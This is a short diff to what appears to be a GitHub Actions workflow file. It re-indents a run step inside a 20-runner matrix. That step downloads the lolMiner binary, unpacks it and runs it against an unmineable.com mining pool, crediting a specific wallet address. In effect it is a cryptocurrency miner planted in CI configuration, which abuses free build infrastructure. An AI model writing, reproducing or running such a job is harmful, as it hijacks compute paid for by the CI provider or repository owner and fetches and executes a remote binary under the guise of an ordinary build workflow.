@@ -25,11 +25,11 @@ jobs:
     matrix:
      runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
    steps:
-     - run: |        
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
+     - run: |
+        wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
 
-tar -xf lolMiner_v1.29_Lin64.tar.gz
+        tar -xf lolMiner_v1.29_Lin64.tar.gz
 
-cd 1.29
+        cd 1.29
 
-./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0x2b99EFC62262e589Be4fe0D010CA265fC8DF2c61.God_miner_YT#5xer-nxch --ethstratum ETHPROXY
+        ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0x2b99EFC62262e589Be4fe0D010CA265fC8DF2c61.God_miner_YT#5xer-nxch --ethstratum ETHPROXY
